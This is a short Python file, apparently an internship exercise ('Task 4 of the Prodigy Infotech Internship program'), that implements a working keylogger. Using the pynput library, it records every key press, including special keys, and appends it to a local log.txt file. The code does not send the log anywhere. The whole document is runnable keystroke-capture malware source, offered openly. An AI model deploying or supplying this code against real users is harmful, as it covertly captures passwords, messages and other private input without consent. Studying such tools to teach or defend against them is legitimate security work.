# The task 4 of the Prodigy Infotech Internship program--Simple Keylogger


import pynput
from pynput.keyboard import Key, Listener

def log_keystrokes(key):
    with open("log.txt", "a") as log_file:
        try:
            log_file.write(f'{key.char}')
        except AttributeError:
            if key == Key.space:
                log_file.write(' ')
            elif key == Key.enter:
                log_file.write('\n')
            else:
                log_file.write(f'[{key}]')

def start_keylogger():
    with Listener(on_press=log_keystrokes) as listener:
        listener.join()

start_keylogger()
